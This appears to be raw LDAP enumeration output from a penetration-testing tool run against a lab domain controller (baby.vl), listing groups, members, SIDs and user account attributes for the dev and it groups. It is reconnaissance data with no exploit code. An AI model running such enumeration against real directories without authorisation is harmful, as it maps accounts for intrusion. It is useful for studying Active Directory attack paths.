LDAP        10.129.234.71   389    BABYDC           description          Members in this group can modify group policy for the domain
LDAP        10.129.234.71   389    BABYDC           member               CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12354
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12391
LDAP        10.129.234.71   389    BABYDC           name                 Group Policy Creator Owners
LDAP        10.129.234.71   389    BABYDC           objectGUID           5ba8abd0-8d33-214f-afa8-893badb23f09
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-520
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Group Policy Creator Owners
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483646
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   RAS and IAS Servers
LDAP        10.129.234.71   389    BABYDC           description          Servers in this group can access remote access properties of users
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12357
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12359
LDAP        10.129.234.71   389    BABYDC           name                 RAS and IAS Servers
LDAP        10.129.234.71   389    BABYDC           objectGUID           c0171285-e1b6-3f4b-a24b-14cc04d04547
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-553
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       RAS and IAS Servers
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       536870912
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483644
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Allowed RODC Password Replication Group
LDAP        10.129.234.71   389    BABYDC           description          Members in this group can have their passwords replicated to all read-only domain controllers in the domain
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12402
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12404
LDAP        10.129.234.71   389    BABYDC           name                 Allowed RODC Password Replication Group
LDAP        10.129.234.71   389    BABYDC           objectGUID           7a320b26-be6c-8344-a875-344eb415a428
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-571
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Allowed RODC Password Replication Group
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       536870912
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483644
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Denied RODC Password Replication Group
LDAP        10.129.234.71   389    BABYDC           description          Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
LDAP        10.129.234.71   389    BABYDC           member               CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Domain Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Cert Publishers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Schema Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=krbtgt,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12405
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12433
LDAP        10.129.234.71   389    BABYDC           name                 Denied RODC Password Replication Group
LDAP        10.129.234.71   389    BABYDC           objectGUID           1655911c-23d2-da43-bee2-cdd9b59d02a9
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-572
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Denied RODC Password Replication Group
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       536870912
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483644
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Enterprise Read-only Domain Controllers
LDAP        10.129.234.71   389    BABYDC           description          Members of this group are Read-Only Domain Controllers in the enterprise
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12429
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12431
LDAP        10.129.234.71   389    BABYDC           name                 Enterprise Read-only Domain Controllers
LDAP        10.129.234.71   389    BABYDC           objectGUID           55d70116-7efd-414e-a40b-510abb86961b
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-498
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Enterprise Read-only Domain Controllers
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483640
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Cloneable Domain Controllers
LDAP        10.129.234.71   389    BABYDC           description          Members of this group that are domain controllers may be cloned.
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12440
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12442
LDAP        10.129.234.71   389    BABYDC           name                 Cloneable Domain Controllers
LDAP        10.129.234.71   389    BABYDC           objectGUID           01076276-3f7a-934c-8a02-1e475f08d65a
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-522
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Cloneable Domain Controllers
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483646
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Protected Users,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   Protected Users
LDAP        10.129.234.71   389    BABYDC           description          Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Protected Users,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145158.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12445
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12447
LDAP        10.129.234.71   389    BABYDC           name                 Protected Users
LDAP        10.129.234.71   389    BABYDC           objectGUID           1f4ffce3-829d-984c-9ffb-7ada56bab0eb
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-525
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Protected Users
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483646
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           isCriticalSystemObject TRUE
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121145159.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000417.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Key Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   DnsAdmins
LDAP        10.129.234.71   389    BABYDC           description          DNS Administrators Group
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=DnsAdmins,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145238.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145238.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12486
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12488
LDAP        10.129.234.71   389    BABYDC           name                 DnsAdmins
LDAP        10.129.234.71   389    BABYDC           objectGUID           8de6e9e5-cf6b-8743-9a05-f7b023f43721
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1101
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       DnsAdmins
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       536870912
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483644
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000001.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   DnsUpdateProxy
LDAP        10.129.234.71   389    BABYDC           description          DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121145238.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121145238.0Z
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12491
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12491
LDAP        10.129.234.71   389    BABYDC           name                 DnsUpdateProxy
LDAP        10.129.234.71   389    BABYDC           objectGUID           61cfa35f-57de-bf4e-b66a-af9a0610e66d
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1102
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       DnsUpdateProxy
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483646
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000001.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=dev,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   dev
LDAP        10.129.234.71   389    BABYDC           member               CN=Ian Walker,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=dev,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151102.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121151103.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          dev
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12789
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12840
LDAP        10.129.234.71   389    BABYDC           name                 dev
LDAP        10.129.234.71   389    BABYDC           objectGUID           61bceb45-5fb8-2745-b86d-ee4273858989
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1103
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       dev
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       268435456
LDAP        10.129.234.71   389    BABYDC           groupType            -2147483646
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000001.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                person
LDAP        10.129.234.71   389    BABYDC                                organizationalPerson
LDAP        10.129.234.71   389    BABYDC                                user
LDAP        10.129.234.71   389    BABYDC           cn                   Jacqueline Barnett
LDAP        10.129.234.71   389    BABYDC           sn                   Barnett
LDAP        10.129.234.71   389    BABYDC           givenName            Jacqueline
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151103.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121151103.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          Jacqueline Barnett
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12793
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=dev,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12798
LDAP        10.129.234.71   389    BABYDC           name                 Jacqueline Barnett
LDAP        10.129.234.71   389    BABYDC           objectGUID           fcb9bd7a-e707-2244-bd1a-bfa9c06aef1c
LDAP        10.129.234.71   389    BABYDC           userAccountControl   66080
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           codePage             0
LDAP        10.129.234.71   389    BABYDC           countryCode          0
LDAP        10.129.234.71   389    BABYDC           badPasswordTime      0
LDAP        10.129.234.71   389    BABYDC           lastLogoff           0
LDAP        10.129.234.71   389    BABYDC           lastLogon            0
LDAP        10.129.234.71   389    BABYDC           pwdLastSet           132819810632000928
LDAP        10.129.234.71   389    BABYDC           primaryGroupID       513
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1104
LDAP        10.129.234.71   389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.234.71   389    BABYDC           logonCount           0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Jacqueline.Barnett
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       805306368
LDAP        10.129.234.71   389    BABYDC           userPrincipalName    Jacqueline.Barnett@baby.vl
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121162927.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000416.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                person
LDAP        10.129.234.71   389    BABYDC                                organizationalPerson
LDAP        10.129.234.71   389    BABYDC                                user
LDAP        10.129.234.71   389    BABYDC           cn                   Ashley Webb
LDAP        10.129.234.71   389    BABYDC           sn                   Webb
LDAP        10.129.234.71   389    BABYDC           givenName            Ashley
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151103.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121151103.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          Ashley Webb
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12803
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=dev,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12808
LDAP        10.129.234.71   389    BABYDC           name                 Ashley Webb
LDAP        10.129.234.71   389    BABYDC           objectGUID           3f551e09-c519-1943-bac7-2c21ff71b0fe
LDAP        10.129.234.71   389    BABYDC           userAccountControl   66080
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           codePage             0
LDAP        10.129.234.71   389    BABYDC           countryCode          0
LDAP        10.129.234.71   389    BABYDC           badPasswordTime      0
LDAP        10.129.234.71   389    BABYDC           lastLogoff           0
LDAP        10.129.234.71   389    BABYDC           lastLogon            0
LDAP        10.129.234.71   389    BABYDC           pwdLastSet           132819810633407081
LDAP        10.129.234.71   389    BABYDC           primaryGroupID       513
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1105
LDAP        10.129.234.71   389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.234.71   389    BABYDC           logonCount           0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Ashley.Webb
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       805306368
LDAP        10.129.234.71   389    BABYDC           userPrincipalName    Ashley.Webb@baby.vl
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121162927.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000416.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                person
LDAP        10.129.234.71   389    BABYDC                                organizationalPerson
LDAP        10.129.234.71   389    BABYDC                                user
LDAP        10.129.234.71   389    BABYDC           cn                   Hugh George
LDAP        10.129.234.71   389    BABYDC           sn                   George
LDAP        10.129.234.71   389    BABYDC           givenName            Hugh
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151103.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121151103.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          Hugh George
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12813
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=dev,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12818
LDAP        10.129.234.71   389    BABYDC           name                 Hugh George
LDAP        10.129.234.71   389    BABYDC           objectGUID           93396f22-e9ba-784a-a884-7ab7070ad8a0
LDAP        10.129.234.71   389    BABYDC           userAccountControl   66080
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           codePage             0
LDAP        10.129.234.71   389    BABYDC           countryCode          0
LDAP        10.129.234.71   389    BABYDC           badPasswordTime      0
LDAP        10.129.234.71   389    BABYDC           lastLogoff           0
LDAP        10.129.234.71   389    BABYDC           lastLogon            0
LDAP        10.129.234.71   389    BABYDC           pwdLastSet           132819810634363083
LDAP        10.129.234.71   389    BABYDC           primaryGroupID       513
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1106
LDAP        10.129.234.71   389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.234.71   389    BABYDC           logonCount           0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Hugh.George
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       805306368
LDAP        10.129.234.71   389    BABYDC           userPrincipalName    Hugh.George@baby.vl
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121162927.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000416.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                person
LDAP        10.129.234.71   389    BABYDC                                organizationalPerson
LDAP        10.129.234.71   389    BABYDC                                user
LDAP        10.129.234.71   389    BABYDC           cn                   Leonard Dyer
LDAP        10.129.234.71   389    BABYDC           sn                   Dyer
LDAP        10.129.234.71   389    BABYDC           givenName            Leonard
LDAP        10.129.234.71   389    BABYDC           distinguishedName    CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           instanceType         4
LDAP        10.129.234.71   389    BABYDC           whenCreated          20211121151103.0Z
LDAP        10.129.234.71   389    BABYDC           whenChanged          20211121151103.0Z
LDAP        10.129.234.71   389    BABYDC           displayName          Leonard Dyer
LDAP        10.129.234.71   389    BABYDC           uSNCreated           12823
LDAP        10.129.234.71   389    BABYDC           memberOf             CN=dev,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           uSNChanged           12828
LDAP        10.129.234.71   389    BABYDC           name                 Leonard Dyer
LDAP        10.129.234.71   389    BABYDC           objectGUID           5643109e-43e0-c341-8090-30a2abd2ce84
LDAP        10.129.234.71   389    BABYDC           userAccountControl   66080
LDAP        10.129.234.71   389    BABYDC           badPwdCount          0
LDAP        10.129.234.71   389    BABYDC           codePage             0
LDAP        10.129.234.71   389    BABYDC           countryCode          0
LDAP        10.129.234.71   389    BABYDC           badPasswordTime      0
LDAP        10.129.234.71   389    BABYDC           lastLogoff           0
LDAP        10.129.234.71   389    BABYDC           lastLogon            0
LDAP        10.129.234.71   389    BABYDC           pwdLastSet           132819810635678033
LDAP        10.129.234.71   389    BABYDC           primaryGroupID       513
LDAP        10.129.234.71   389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1107
LDAP        10.129.234.71   389    BABYDC           accountExpires       9223372036854775807
LDAP        10.129.234.71   389    BABYDC           logonCount           0
LDAP        10.129.234.71   389    BABYDC           sAMAccountName       Leonard.Dyer
LDAP        10.129.234.71   389    BABYDC           sAMAccountType       805306368
LDAP        10.129.234.71   389    BABYDC           userPrincipalName    Leonard.Dyer@baby.vl
LDAP        10.129.234.71   389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP        10.129.234.71   389    BABYDC                                20211121162927.0Z
LDAP        10.129.234.71   389    BABYDC                                16010101000416.0Z
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=Ian Walker,OU=dev,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           [+] Response for object: CN=it,CN=Users,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC           objectClass          top
LDAP        10.129.234.71   389    BABYDC                                group
LDAP        10.129.234.71   389    BABYDC           cn                   it
LDAP        10.129.234.71   389    BABYDC           member               CN=Caroline Robinson,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP        10.129.234.71   389    BABYDC                                CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
